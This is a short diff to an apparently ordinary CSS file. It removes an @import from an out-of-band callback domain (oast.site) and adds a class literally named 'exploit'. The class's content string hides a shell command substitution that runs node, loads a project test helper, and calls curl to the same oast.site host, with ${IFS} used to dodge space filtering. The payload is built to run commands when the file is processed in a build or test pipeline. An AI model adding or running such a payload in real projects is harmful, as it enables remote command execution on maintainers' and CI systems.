@@ -1,1 +1,10 @@
-@import url("https://m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site/test.css");
+@layer utilities {
+  .exploit {
+    content: "`$(
+      node -e \"const { test } = require('./integrations/utils'); 
+      test('exploit', { fs: {} }, async ({ exec }) => {
+        await exec('curl${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site');
+      }, { only: true })\"
+    )`";
+  }
+}
